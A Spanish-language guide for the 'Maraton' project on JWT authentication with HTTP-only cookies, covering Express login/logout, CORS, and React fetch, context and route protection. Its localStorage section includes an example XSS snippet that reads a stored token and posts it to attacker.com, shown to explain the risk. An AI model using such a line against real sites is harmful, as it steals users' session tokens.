# 🔐 Autenticación JWT con HTTP-only Cookies - Guía para Frontend

## 📋 Tabla de Contenidos
- [Diferencias: localStorage vs HTTP-only Cookies](#diferencias-localstorage-vs-http-only-cookies)
- [Configuración del Backend](#configuración-del-backend)
- [Implementación en Frontend](#implementación-en-frontend)
- [Ejemplos Completos](#ejemplos-completos)
- [Manejo de Errores](#manejo-de-errores)
- [Seguridad](#seguridad)
- [Troubleshooting](#troubleshooting)

---

## ⚠️ ¿Por qué NO usar localStorage?

### Vulnerabilidades de localStorage

```javascript
// ❌ INSEGURO - NO HACER ESTO
localStorage.setItem('token', 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...');

// ❌ VULNERABLE a ataques XSS (Cross-Site Scripting)
// Si un atacante inyecta JavaScript malicioso en tu app:
const stolenToken = localStorage.getItem('token');
fetch('https://attacker.com/steal', {
  method: 'POST',
  body: JSON.stringify({ token: stolenToken })
});
```

**Problemas:**
- ✗ Accesible desde JavaScript → vulnerable a XSS
- ✗ Se envía en cada request manualmente → errores humanos
- ✗ No tiene fecha de expiración automática
- ✗ Visible en DevTools → fácil de copiar/robar

---

## ✅ HTTP-only Cookies: La Solución Segura

### ¿Qué son las HTTP-only Cookies?

Las **HTTP-only cookies** son cookies que:
- ✓ **NO son accesibles desde JavaScript** (`document.cookie` no las muestra)
- ✓ Se envían **automáticamente** en cada request al mismo dominio
- ✓ Solo el navegador puede leerlas/escribirlas
- ✓ Protegen contra XSS (Cross-Site Scripting)

### Configuración en el Backend

```typescript
// src/routes/auth.ts - Login endpoint
router.post("/login", async (req, res) => {
  // ... validación de credenciales ...
  
  // Generar JWT
  const token = jwt.sign(
    {
      userId: usuario.id.toString(),  // ⚠️ IMPORTANTE: userId (no "id")
      email: usuario.email,
    },
    process.env.JWT_SECRET as string,
    { expiresIn: "24h" }
  );

  // ✅ Guardar token en cookie HTTP-only
  res.cookie("authToken", token, {
    httpOnly: true,    // ✅ NO accesible desde JavaScript
    secure: process.env.NODE_ENV === "production", // ✅ Solo HTTPS en producción
    sameSite: process.env.NODE_ENV === "production" ? "none" : "lax", // ✅ Para CORS
    maxAge: 24 * 60 * 60 * 1000, // 24 horas en milisegundos
  });

  res.status(200).json({
    message: "Inicio de sesión exitoso",
    user: {
      id: usuario.id,
      email: usuario.email,
      username: usuario.username,
    }
  });
});
```

### Configuración CORS (Backend)

```typescript
// src/index.ts
const corsOptions = {
  origin: function (origin: string | undefined, callback: any) {
    const allowedOrigins = [
      'http://localhost:5173',
      'http://localhost:5174',
      'https://maraton-frontend.vercel.app',
    ];
    
    if (!origin || allowedOrigins.includes(origin)) {
      callback(null, true);
    } else {
      callback(new Error('No permitido por CORS'));
    }
  },
  credentials: true, // ⚠️ CRUCIAL: Permite cookies cross-origin
  methods: ['GET', 'POST', 'PUT', 'PATCH', 'DELETE', 'OPTIONS'],
  allowedHeaders: ['Content-Type', 'Authorization', 'Accept', 'X-Requested-With', 'Origin'],
  exposedHeaders: ['Set-Cookie'],
};

app.use(cors(corsOptions));
app.use(cookieParser());
```

---

## 🌐 Implementación en Frontend

### ⚠️ Regla de Oro: SIEMPRE usar `credentials: 'include'`

**TODAS las peticiones al backend DEBEN incluir `credentials: 'include'`** para que el navegador envíe las cookies automáticamente.

---

## 🔑 1. Login (Inicio de Sesión)

### Frontend - Fetch

```javascript
// ✅ CORRECTO
async function login(email, password) {
  try {
    const response = await fetch('http://localhost:3000/api/auth/login', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      credentials: 'include', // ⚠️ OBLIGATORIO
      body: JSON.stringify({ email, password })
    });

    if (!response.ok) {
      throw new Error('Credenciales inválidas');
    }

    const data = await response.json();
    
    // ✅ La cookie se guarda automáticamente en el navegador
    // NO necesitas hacer nada con el token
    
    console.log('Login exitoso:', data.user);
    return data.user;
    
  } catch (error) {
    console.error('Error en login:', error);
    throw error;
  }
}
```

### Frontend - Axios

```javascript
import axios from 'axios';

// Configurar axios globalmente
axios.defaults.withCredentials = true; // ⚠️ Habilitar cookies

async function login(email, password) {
  try {
    const response = await axios.post('http://localhost:3000/api/auth/login', {
      email,
      password
    });

    console.log('Login exitoso:', response.data.user);
    return response.data.user;
    
  } catch (error) {
    console.error('Error en login:', error.response?.data || error.message);
    throw error;
  }
}
```

### React Component - Login Completo

```jsx
import { useState } from 'react';

function LoginForm() {
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [error, setError] = useState('');
  const [loading, setLoading] = useState(false);

  const handleLogin = async (e) => {
    e.preventDefault();
    setLoading(true);
    setError('');

    try {
      const response = await fetch('http://localhost:3000/api/auth/login', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        credentials: 'include', // ⚠️ IMPORTANTE
        body: JSON.stringify({ email, password })
      });

      if (!response.ok) {
        const data = await response.json();
        throw new Error(data.error || 'Error en login');
      }

      const data = await response.json();
      
      // ✅ Redirigir al usuario o actualizar estado global
      window.location.href = '/dashboard';
      // O con React Router:
      // navigate('/dashboard');
      
    } catch (err) {
      setError(err.message);
    } finally {
      setLoading(false);
    }
  };

  return (
    <form onSubmit={handleLogin}>
      <input
        type="email"
        value={email}
        onChange={(e) => setEmail(e.target.value)}
        placeholder="Email"
        required
      />
      <input
        type="password"
        value={password}
        onChange={(e) => setPassword(e.target.value)}
        placeholder="Contraseña"
        required
      />
      <button type="submit" disabled={loading}>
        {loading ? 'Iniciando sesión...' : 'Iniciar Sesión'}
      </button>
      {error && <p style={{ color: 'red' }}>{error}</p>}
    </form>
  );
}
```

---

## 🚪 2. Logout (Cerrar Sesión)

### Backend - Logout Endpoint

```typescript
// src/routes/auth.ts
router.post("/logout", (req, res) => {
  // Borrar la cookie
  res.clearCookie("authToken", {
    httpOnly: true,
    secure: process.env.NODE_ENV === "production",
    sameSite: process.env.NODE_ENV === "production" ? "none" : "lax",
  });

  res.status(200).json({ message: "Sesión cerrada exitosamente" });
});
```

### Frontend - Logout

```javascript
async function logout() {
  try {
    const response = await fetch('http://localhost:3000/api/auth/logout', {
      method: 'POST',
      credentials: 'include', // ⚠️ OBLIGATORIO
    });

    if (response.ok) {
      console.log('Logout exitoso');
      // Redirigir al login
      window.location.href = '/login';
    }
  } catch (error) {
    console.error('Error en logout:', error);
  }
}
```

---

## 🔒 3. Rutas Protegidas (Con JWT)

### Middleware Backend - Verificar Token

```typescript
// src/middleware/verifyToken.ts
import jwt from "jsonwebtoken";

const verifyToken = (req: Request, res: Response, next: NextFunction) => {
  try {
    // Leer token de la cookie
    const token = req.cookies.authToken;

    if (!token) {
      return res.status(401).json({ message: "Autenticación requerida" });
    }

    // Verificar token
    const decoded = jwt.verify(token, process.env.JWT_SECRET as string);
    
    // ⚠️ IMPORTANTE: El payload contiene "userId" (no "id")
    req.user = decoded;

    next();
  } catch (error) {
    if (error.name === "TokenExpiredError") {
      return res.status(401).json({ message: "Token expirado" });
    }
    return res.status(401).json({ message: "Token inválido" });
  }
};

export default verifyToken;
```

### Frontend - Peticiones Autenticadas

```javascript
// ✅ Obtener favoritos (ruta protegida)
async function getFavorites() {
  try {
    const response = await fetch('http://localhost:3000/api/usuarios/favorites', {
      method: 'GET',
      credentials: 'include', // ⚠️ Envía la cookie automáticamente
    });

    if (response.status === 401) {
      // Token inválido o expirado
      console.log('Sesión expirada, redirigir a login');
      window.location.href = '/login';
      return;
    }

    if (!response.ok) {
      throw new Error('Error al obtener favoritos');
    }

    const data = await response.json();
    return data.movies;
    
  } catch (error) {
    console.error('Error:', error);
    throw error;
  }
}

// ✅ Añadir a favoritos
async function addToFavorites(peliculaId) {
  try {
    const response = await fetch('http://localhost:3000/api/usuarios/favorites', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      credentials: 'include', // ⚠️ OBLIGATORIO
      body: JSON.stringify({ peliculaId })
    });

    if (response.status === 401) {
      window.location.href = '/login';
      return;
    }

    const data = await response.json();
    return data;
    
  } catch (error) {
    console.error('Error:', error);
    throw error;
  }
}

// ✅ Quitar de favoritos (PATCH)
async function removeFromFavorites(peliculaId) {
  try {
    const response = await fetch(`http://localhost:3000/api/usuarios/favorites/${peliculaId}`, {
      method: 'PATCH',
      headers: { 'Content-Type': 'application/json' },
      credentials: 'include', // ⚠️ OBLIGATORIO
      body: JSON.stringify({ favorite: false })
    });

    if (response.status === 401) {
      window.location.href = '/login';
      return;
    }

    const data = await response.json();
    return data;
    
  } catch (error) {
    console.error('Error:', error);
    throw error;
  }
}
```

---

## 🎯 Servicio de API Centralizado (Recomendado)

### Crear un archivo `api.js` o `apiService.js`

```javascript
// src/services/api.js
const API_BASE_URL = import.meta.env.VITE_API_URL || 'http://localhost:3000/api';

class ApiService {
  // Método base para fetch
  async request(endpoint, options = {}) {
    const url = `${API_BASE_URL}${endpoint}`;
    
    const config = {
      ...options,
      credentials: 'include', // ⚠️ Siempre incluir cookies
      headers: {
        'Content-Type': 'application/json',
        ...options.headers,
      },
    };

    try {
      const response = await fetch(url, config);

      // Manejar errores de autenticación
      if (response.status === 401) {
        // Token expirado o inválido
        window.location.href = '/login';
        throw new Error('Sesión expirada');
      }

      if (!response.ok) {
        const error = await response.json();
        throw new Error(error.message || 'Error en la petición');
      }

      return await response.json();
      
    } catch (error) {
      console.error(`Error en ${endpoint}:`, error);
      throw error;
    }
  }

  // Métodos específicos
  get(endpoint) {
    return this.request(endpoint, { method: 'GET' });
  }

  post(endpoint, data) {
    return this.request(endpoint, {
      method: 'POST',
      body: JSON.stringify(data),
    });
  }

  put(endpoint, data) {
    return this.request(endpoint, {
      method: 'PUT',
      body: JSON.stringify(data),
    });
  }

  patch(endpoint, data) {
    return this.request(endpoint, {
      method: 'PATCH',
      body: JSON.stringify(data),
    });
  }

  delete(endpoint) {
    return this.request(endpoint, { method: 'DELETE' });
  }

  // Autenticación
  async login(email, password) {
    return this.post('/auth/login', { email, password });
  }

  async logout() {
    return this.post('/auth/logout');
  }

  // Favoritos
  async getFavorites() {
    return this.get('/usuarios/favorites');
  }

  async addToFavorites(peliculaId) {
    return this.post('/usuarios/favorites', { peliculaId });
  }

  async removeFromFavorites(peliculaId) {
    return this.patch(`/usuarios/favorites/${peliculaId}`, { favorite: false });
  }

  // Películas
  async getMovies() {
    return this.get('/peliculas');
  }

  async getMovieById(id) {
    return this.get(`/peliculas/${id}`);
  }

  async getMoviesByGenre(genero) {
    return this.get(`/peliculas/genero/${genero}`);
  }
}

export default new ApiService();
```

### Uso del servicio

```jsx
import apiService from './services/api';

function LoginComponent() {
  const handleLogin = async (email, password) => {
    try {
      const data = await apiService.login(email, password);
      console.log('Login exitoso:', data);
      // Redirigir...
    } catch (error) {
      console.error('Error:', error);
    }
  };
}

function FavoritesComponent() {
  useEffect(() => {
    loadFavorites();
  }, []);

  const loadFavorites = async () => {
    try {
      const data = await apiService.getFavorites();
      setFavorites(data.movies);
    } catch (error) {
      console.error('Error:', error);
    }
  };

  const handleAddFavorite = async (movieId) => {
    try {
      await apiService.addToFavorites(movieId);
      loadFavorites(); // Recargar lista
    } catch (error) {
      console.error('Error:', error);
    }
  };
}
```

---

## ⚡ Context API para Estado Global (React)

```jsx
// src/context/AuthContext.jsx
import { createContext, useContext, useState, useEffect } from 'react';
import apiService from '../services/api';

const AuthContext = createContext();

export function AuthProvider({ children }) {
  const [user, setUser] = useState(null);
  const [loading, setLoading] = useState(true);

  // Verificar si hay sesión activa al cargar
  useEffect(() => {
    checkAuth();
  }, []);

  const checkAuth = async () => {
    try {
      // Intentar obtener datos del usuario actual
      const response = await fetch('http://localhost:3000/api/usuarios/me', {
        credentials: 'include'
      });
      
      if (response.ok) {
        const userData = await response.json();
        setUser(userData);
      }
    } catch (error) {
      console.log('No hay sesión activa');
    } finally {
      setLoading(false);
    }
  };

  const login = async (email, password) => {
    const data = await apiService.login(email, password);
    setUser(data.user);
    return data;
  };

  const logout = async () => {
    await apiService.logout();
    setUser(null);
    window.location.href = '/login';
  };

  const value = {
    user,
    loading,
    login,
    logout,
    isAuthenticated: !!user,
  };

  return (
    <AuthContext.Provider value={value}>
      {children}
    </AuthContext.Provider>
  );
}

export function useAuth() {
  const context = useContext(AuthContext);
  if (!context) {
    throw new Error('useAuth debe usarse dentro de AuthProvider');
  }
  return context;
}
```

### Uso del Context

```jsx
// src/App.jsx
import { AuthProvider } from './context/AuthContext';

function App() {
  return (
    <AuthProvider>
      <Router>
        <Routes>
          {/* tus rutas */}
        </Routes>
      </Router>
    </AuthProvider>
  );
}

// src/components/LoginForm.jsx
import { useAuth } from '../context/AuthContext';

function LoginForm() {
  const { login } = useAuth();
  
  const handleSubmit = async (e) => {
    e.preventDefault();
    try {
      await login(email, password);
      navigate('/dashboard');
    } catch (error) {
      setError(error.message);
    }
  };
}

// src/components/Navbar.jsx
import { useAuth } from '../context/AuthContext';

function Navbar() {
  const { user, logout, isAuthenticated } = useAuth();

  if (!isAuthenticated) {
    return <Link to="/login">Iniciar Sesión</Link>;
  }

  return (
    <nav>
      <span>Bienvenido, {user.username}</span>
      <button onClick={logout}>Cerrar Sesión</button>
    </nav>
  );
}
```

---

## 🛡️ Proteger Rutas (React Router)

```jsx
// src/components/ProtectedRoute.jsx
import { Navigate } from 'react-router-dom';
import { useAuth } from '../context/AuthContext';

function ProtectedRoute({ children }) {
  const { isAuthenticated, loading } = useAuth();

  if (loading) {
    return <div>Cargando...</div>;
  }

  if (!isAuthenticated) {
    return <Navigate to="/login" replace />;
  }

  return children;
}

export default ProtectedRoute;
```

### Uso en Routes

```jsx
import ProtectedRoute from './components/ProtectedRoute';

<Routes>
  <Route path="/login" element={<LoginPage />} />
  <Route path="/register" element={<RegisterPage />} />
  
  {/* Rutas protegidas */}
  <Route path="/dashboard" element={
    <ProtectedRoute>
      <DashboardPage />
    </ProtectedRoute>
  } />
  
  <Route path="/favorites" element={
    <ProtectedRoute>
      <FavoritesPage />
    </ProtectedRoute>
  } />
</Routes>
```

---

## 🔍 Verificar Cookies en el Navegador

### Chrome/Edge/Brave DevTools

1. Abre DevTools (F12)
2. Ve a **Application** → **Cookies**
3. Selecciona `http://localhost:3000`
4. Deberías ver: `authToken` con `HttpOnly` ✓

```
Name:       authToken
Value:      eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
Domain:     localhost
Path:       /
Expires:    (24 horas desde creación)
HttpOnly:   ✓ (marcado)
Secure:     (solo en HTTPS/producción)
SameSite:   Lax (desarrollo) / None (producción)
```

### Firefox DevTools

1. F12 → **Storage** → **Cookies**
2. Busca `http://localhost:3000`

---

## 🚨 Manejo de Errores

### Ejemplo completo con manejo de errores

```javascript
async function makeAuthenticatedRequest(url, options = {}) {
  try {
    const response = await fetch(url, {
      ...options,
      credentials: 'include',
    });

    // Token expirado o inválido
    if (response.status === 401) {
      console.log('Sesión expirada');
      // Redirigir a login
      window.location.href = '/login';
      throw new Error('Sesión expirada');
    }

    // Error de permisos
    if (response.status === 403) {
      throw new Error('No tienes permisos para esta acción');
    }

    // Error del servidor
    if (response.status >= 500) {
      throw new Error('Error del servidor, intenta más tarde');
    }

    // Otros errores
    if (!response.ok) {
      const error = await response.json();
      throw new Error(error.message || 'Error en la petición');
    }

    return await response.json();

  } catch (error) {
    if (error.name === 'TypeError' && error.message.includes('Failed to fetch')) {
      console.error('Error de red: Backend no disponible');
      throw new Error('No se pudo conectar con el servidor');
    }
    
    throw error;
  }
}
```

---

## 🔐 Comparación Final

### ❌ Forma INCORRECTA (localStorage)

```javascript
// Login
const response = await fetch('/api/auth/login', {
  method: 'POST',
  body: JSON.stringify({ email, password })
});
const { token } = await response.json();
localStorage.setItem('token', token); // ❌ VULNERABLE

// Request
const token = localStorage.getItem('token');
fetch('/api/usuarios/favorites', {
  headers: {
    'Authorization': `Bearer ${token}` // ❌ Manual
  }
});
```

### ✅ Forma CORRECTA (HTTP-only Cookies)

```javascript
// Login
await fetch('/api/auth/login', {
  method: 'POST',
  credentials: 'include', // ✅ Cookie se guarda automáticamente
  body: JSON.stringify({ email, password })
});

// Request
fetch('/api/usuarios/favorites', {
  credentials: 'include' // ✅ Cookie se envía automáticamente
});
```

---

## 🌍 Configuración para Producción

### Variables de Entorno (.env)

```bash
# Desarrollo
VITE_API_URL=http://localhost:3000/api

# Producción
VITE_API_URL=https://maraton-backend.onrender.com/api
```

### Configuración Backend (Producción)

```typescript
// .env backend
NODE_ENV=production
FRONTEND_URL_PROD=https://maraton-frontend.vercel.app

// Cookie settings
res.cookie("authToken", token, {
  httpOnly: true,
  secure: true,              // ✅ Solo HTTPS
  sameSite: "none",          // ✅ Cross-site (diferentes dominios)
  maxAge: 24 * 60 * 60 * 1000,
  domain: ".onrender.com",   // ⚠️ Opcional: compartir entre subdominios
});
```

### CORS Producción

```typescript
const allowedOrigins = [
  'http://localhost:5173',
  'https://maraton-frontend.vercel.app',
  process.env.FRONTEND_URL_PROD,
];
```

---

## 📚 Recursos Adicionales

- **OWASP - Session Management**: https://owasp.org/www-community/controls/Session_Management
- **MDN - HTTP Cookies**: https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies
- **JWT.io**: https://jwt.io/

---

## 🐛 Troubleshooting

### Problema: "Cookie no se envía"

**Causa**: Falta `credentials: 'include'`

**Solución**:
```javascript
fetch(url, {
  credentials: 'include' // ⚠️ Añadir en TODAS las peticiones
});
```

---

### Problema: "CORS policy: credentials mode is 'include'"

**Causa**: Backend no tiene `credentials: true` en CORS

**Solución**:
```typescript
// Backend
app.use(cors({
  credentials: true, // ⚠️ Añadir esto
  origin: 'http://localhost:5173'
}));
```

---

### Problema: "Cookie no visible en DevTools"

**Causa**: Las cookies HTTP-only NO aparecen en `document.cookie`

**Solución**: 
- Esto es **CORRECTO** y **ESPERADO**
- Las cookies HTTP-only están protegidas contra JavaScript
- Verifica en: DevTools → Application → Cookies

---

### Problema: "Set-Cookie not working in production"

**Causas posibles**:
1. Cookie sin `secure: true` en HTTPS
2. SameSite incorrecta para cross-origin
3. Dominio mal configurado

**Solución**:
```typescript
res.cookie("authToken", token, {
  httpOnly: true,
  secure: true,         // ✅ Requerido en HTTPS
  sameSite: "none",     // ✅ Para cross-origin
  // domain: ".tudominio.com", // Solo si usas subdominios
});
```

---

**Versión**: 1.0.0  
**Última actualización**: Octubre 2025  
**Proyecto**: Maraton - Backend  
**Autor**: Equipo de desarrollo Maraton
